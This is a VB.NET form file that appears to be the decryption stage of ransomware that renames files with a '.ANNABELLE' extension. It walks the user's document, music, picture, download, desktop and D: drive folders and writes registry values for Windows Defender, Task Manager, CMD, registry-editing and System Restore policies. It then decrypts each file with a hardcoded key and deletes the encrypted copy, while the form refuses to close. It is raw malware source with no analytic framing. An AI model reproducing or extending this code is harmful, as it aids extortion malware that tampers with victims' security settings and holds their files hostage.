Public Class Form3

    Private Sub Form3_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True
    End Sub

    Private Sub Form3_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        Form2.Close()
        Form2.Hide()
        My.Computer.Audio.Stop()
    End Sub
    Private Sub Form3_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Process.Start("C:\Windows\explorer.exe")
        Me.WindowState = FormWindowState.Normal
        Me.ShowInTaskbar = False
        Try
            For Each foundDirectory As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyDocuments,
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile As String In My.Computer.FileSystem.GetFiles(
            foundDirectory)
                    If foundFile.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile)
                    End If
                Next
            Next

        Catch ex As Exception


        End Try
        Try
            For Each foundFile2 As String In My.Computer.FileSystem.GetFiles(
          My.Computer.FileSystem.SpecialDirectories.MyDocuments)

                If foundFile2.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile2)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyMusic,
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyMusic)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyPictures,
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyPictures)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception
        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Downloads",
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                            "C:\Users\" + Environment.UserName + "\Downloads",
                            FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Downloads")

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Desktop",
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                              "C:\Users\" + Environment.UserName + "\Desktop",
                             FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
           foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Desktop")
                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "D:\",
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception
        End Try
        Timer1.Start()
        Dim RegistryKey As Object
        RegistryKey = CreateObject("WScript.Shell")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableRoutinelyTakingAction", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Enabled", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings\Enabled", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\USBSTOR", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\DisableCMD", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\System\DisableCMD", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\DisableCMD", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\DisableCMD", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\DisableCMD", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\Restrict_Run", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\Restrict_Run", 0, "REG_DWORD")
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim filenamez As String
        ProgressBar2.Value = 25
        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Timer1.Stop()
            Application.ExitThread()


        Else

            ListBox1.SelectedIndex = ProgressBar1.Value

            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)
            ProgressBar2.Value = 50
            Try
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                bytKey = Form1.CreateKey("u8gPA4uY6w5CMCgw")
                bytIV = Form1.CreateIV("u8gPA4uY6w5CMCgw")

                Dim withParts As String = "Books and Chapters and Pages"
                Dim filenamezu As String = Replace(filenamez, ".ANNABELLE", "")
                Form1.EncryptOrDecryptFile(filenamez, filenamezu, _
                                     bytKey, bytIV, Form1.CryptoAction.ActionDecrypt)
                My.Computer.FileSystem.DeleteFile(filenamez)

            Catch ex As Exception

            End Try
            ProgressBar2.Value = 0
            ProgressBar1.Increment(1)
        End If
    End Sub
End Class